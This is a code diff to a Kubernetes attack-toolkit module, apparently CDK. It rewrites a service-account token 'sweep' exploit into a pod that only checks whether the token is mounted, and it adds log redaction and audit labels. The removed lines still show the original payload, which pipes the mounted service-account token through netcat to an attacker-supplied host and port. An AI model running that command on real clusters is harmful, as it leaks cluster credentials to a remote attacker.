@@ -31,21 +31,26 @@ import (
 	"github.com/cdk-team/CDK/pkg/errors"
 	"github.com/cdk-team/CDK/pkg/plugin"
 	"github.com/cdk-team/CDK/pkg/tool/kubectl"
+	"github.com/cdk-team/CDK/pkg/util"
 )
 
-var k8sCreateSystemPodAPI = "/api/v1/namespaces/kube-system/pods"
+var k8sCreateSystemPodAPI = "/api/v1/namespaces/default/pods"
 var k8sGetSATokenPodConf = `{
 	"apiVersion": "v1",
 	"kind": "Pod",
 	"metadata": {
 		"name": "cdk-rbac-validator-create-pod",
-		"namespace": "kube-system"
+		"namespace": "default",
+		"labels": {
+			"audit.cdk/owner": "cdk",
+			"audit.cdk/component": "sa-token-validator"
+		}
 	},
 	"spec": {
 		"automountServiceAccountToken": true,
 		"containers": [{
-			"args": ["-c", "apt update && apt install -y netcat; cat /run/secrets/kubernetes.io/serviceaccount/token | nc ${RHOST} ${RPORT}; sleep 300"],
-			"command": ["/bin/sh"],
+			"args": ["-c", "test -s ${SA_TOKEN_PATH} && echo token-mounted || echo token-missing; sleep 30"],
+			"command": ["${SHELL_PATH}"],
 			"image": "ubuntu",
 			"name": "ubuntu"
 		}],
@@ -64,8 +69,8 @@ func GetK8sSATokenViaCreatePod(tokenPath string, targetServiceAccount string, rh
 	}
 	fmt.Println("\tFind K8s api-server in ENV:", addr)
 
-	// create a pod with target serviceaccount token mounted
-	log.Printf("Trying to create a pod to dump service-account:%s token to remote server %s:%s\n", targetServiceAccount, rhost, rport)
+	// create a short-lived labeled pod with target serviceaccount token mounted
+	log.Printf("Trying to create a labeled pod to validate service-account:%s token mount state; no token is sent to remote endpoints\n", targetServiceAccount)
 
 	opts := kubectl.K8sRequestOption{
 		TokenPath: "",
@@ -86,18 +91,19 @@ func GetK8sSATokenViaCreatePod(tokenPath string, targetServiceAccount string, rh
 		opts.TokenPath = tokenPath
 	}
 
-	opts.PostData = strings.Replace(k8sGetSATokenPodConf, "${RHOST}", rhost, -1)
-	opts.PostData = strings.Replace(opts.PostData, "${RPORT}", rport, -1)
-	opts.PostData = strings.Replace(opts.PostData, "${TARGET_SERVICE_ACCOUNT}", targetServiceAccount, -1)
+	opts.PostData = strings.Replace(k8sGetSATokenPodConf, "${TARGET_SERVICE_ACCOUNT}", targetServiceAccount, -1)
+	opts.PostData = strings.Replace(opts.PostData, "${SHELL_PATH}", util.ShellPath(), -1)
+	opts.PostData = strings.Replace(opts.PostData, "${SA_TOKEN_PATH}", conf.K8sSATokenDefaultPath, -1)
 
-	log.Println("Request Body: ", opts.PostData)
+	log.Println("Request Body: ", util.RedactSensitive(opts.PostData))
 
 	resp, err := kubectl.ServerAccountRequest(opts)
 	if err != nil {
 		return &errors.CDKRuntimeError{Err: err, CustomMsg: "err found while requesting K8s apiserver."}
 	}
 	log.Println("api-server response:")
-	fmt.Println(resp)
+	fmt.Println(util.RedactSensitive(resp))
+	util.WriteAuditManifest("pod", "cdk-rbac-validator-create-pod", opts.PostData)
 
 	return nil
 }
@@ -106,7 +112,7 @@ func GetK8sSATokenViaCreatePod(tokenPath string, targetServiceAccount string, rh
 type K8sGetSATokenViaCreatePodS struct{ base.BaseExploit }
 
 func (p K8sGetSATokenViaCreatePodS) Desc() string {
-	return "Dump target service-account token and send it to remote ip:port, usage: cdk run k8s-sa-token-sweep (default|anonymous|<service-account-token-path>) <target-service-account> <ip> <port>"
+	return "Create a labeled validation pod to check target service-account token mount state without exfiltrating token data, usage: cdk run k8s-sa-token-sweep (default|anonymous|<service-account-token-path>) <target-service-account> <ip> <port>"
 }
 func (p K8sGetSATokenViaCreatePodS) Run() bool {
 	args := cli.Args["<args>"].([]string)
